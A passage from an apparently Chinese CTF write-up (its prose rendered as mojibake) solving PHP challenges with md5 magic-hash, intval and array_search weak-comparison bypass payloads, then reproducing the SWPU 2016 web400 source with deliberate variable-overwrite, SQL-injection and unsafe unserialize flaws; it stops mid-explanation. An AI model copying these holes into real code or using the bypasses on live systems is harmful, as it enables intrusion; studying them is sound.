class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5ç»•è¿‡ï¼Œæ‰¾ä¸€ä¸ªçº¯å­—æ¯çš„å’Œä¸€ä¸ªçº¯æ•°å­—çš„åä¸€ä¸‹å°±å¥½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctype=YcGyb&amp;is_num=807016042</span><br></pre></td></tr></table></figure><p>ç„¶åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>?114&#x3D;1e9&amp;514&#x3D;99999999999aå³å¯ã€‚</p><p>æœ€åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°ç»„ä¸­ä¸èƒ½åŒ¹é…åˆ°NSSä¸”æ•°ç»„çš„å€¼è¢«intvalè¿‡äº†ï¼Œä¸å¯èƒ½ä¸ºNSSã€‚æ­¤å¤„æœ‰ä¸€ä¸ªarray_searchï¼Œæ˜¯å¼±æ¯”è¾ƒï¼Œ0&#x3D;&#x3D;0ç»•è¿‡å³å¯ï¼ŒNSSä¸æ•°å­—æ¯”è¾ƒæ—¶ä¸º0.å› æ­¤array[]&#x3D;0å³å¯ã€‚ç´¢å¼•ä¹Ÿæ˜¯0ï¼Œç¬¦åˆã€‚</p><h2 id="SWPU-2016-web400"><a href="#SWPU-2016-web400" class="headerlink" title="[SWPU 2016]web400"></a>[SWPU 2016]web400</h2><p>æºç æ²¡æœ‰ç»™ï¼Œåªèƒ½å»wpé‡Œé¢æ‰¾äº†ã€‚</p><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&quot;_POST&quot;</span>,<span class="string">&quot;_GET&quot;</span>,<span class="string">&quot;_COOKIE&quot;</span>) <span class="keyword">as</span> <span class="variable">$key</span>)&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$$key</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$v</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hello,hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$k</span>[<span class="number">0</span>] !=<span class="string">&#x27;_&#x27;</span>?<span class="variable">$$k</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$v</span>):<span class="variable">$$k</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>riji.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] !== <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">                <span class="variable">$sql1</span> = <span class="string">&quot;select * from msg where userid= <span class="subst">$id</span> order by id&quot;</span>;</span><br><span class="line">                <span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>);</span><br><span class="line">                <span class="variable">$result1</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$temp</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$query</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result1</span>[]=<span class="variable">$temp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$result1</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$o</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">display</span>(<span class="variable">$o</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;common.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$msgid</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === <span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>] . <span class="variable">$this</span>-&gt;data . <span class="variable">$username</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;(=-=)!!&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_method</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>() === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_msg&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_msg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_user&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_user</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_msg</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;msgid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;msgid);</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;DELETE FROM msg where id=&#x27;<span class="subst">$msg_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your msg_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_user</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;userid)&#123;</span><br><span class="line">            <span class="variable">$user_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_id</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Admin can\&#x27;t delete!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql2</span> = <span class="string">&quot;DELETE FROM user where userid=&#x27;<span class="subst">$user_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your user_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$api</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">do_method</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$login</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;passwd&#x27;</span>] == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$user_cookie</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line">            <span class="variable">$cookies</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">            <span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookies</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&#x27;/web/&#x27;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>forget.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$forget</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$check</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>]));</span><br><span class="line">            <span class="variable">$name</span> = <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:/web/repass.php?username=<span class="subst">$name</span>&amp;check=<span class="subst">$check</span>&amp;mibao=<span class="subst">$mibao</span>&amp;pass=<span class="subst">$pass</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Get salt Worng?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Please check!!?&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ¥æ‹ä¸€ä¸‹æ€è·¯ï¼šriji.phpä¸­å­˜åœ¨sqlæ³¨å…¥çš„ç‚¹ä¹Ÿå°±æ˜¯idï¼Œä½†æ˜¯idåœ¨ä¹‹å‰è¢«èµ‹å€¼äº†ï¼Œæœ‰æ²¡æœ‰åŠæ³•è®©ä»–ä¸è¿›å…¥ifå‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£å°±æ˜¯result[â€˜useridâ€™]ç»“æœä¸ºç©ºçš„æƒ…å†µä¸‹ã€‚</p><p>å…ˆåˆ©ç”¨api.phpçš„ä¸€ä¸ªæ¥å£å‡½æ•°ä»æ•°æ®åº“åˆ é™¤æˆ‘ç°åœ¨ç™»é™†çš„ç”¨æˆ·ï¼Œä½¿select * from user where name&#x3D;â€™$usernameâ€™æŸ¥è¯¢ä¸ºç©ºï¼Œå› ä¸ºæˆ‘ä»¬ä¸€ç›´ç™»é™†ï¼Œæ‰€ä»¥sessionä¼šåœ¨æœåŠ¡å™¨ç«¯ä¿æŒæˆ‘ä»¬ç™»é™†çš„çŠ¶æ€ï¼ˆä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨ç«¯çš„sessionä¸ä¼šæ³¨é”€ï¼‰ï¼Œæ‰€ä»¥if($_SESSION[â€˜userâ€™])åœ¨æ³¨é”€ä¹‹å‰ä¸€ç›´ä¸ºçœŸï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­åˆ é™¤æˆ‘ä»¬ç™»é™†çš„ç”¨æˆ·ä¹‹åï¼Œåˆ™ä½¿ï¼š$id &#x3D; intval($result[â€˜useridâ€™]); 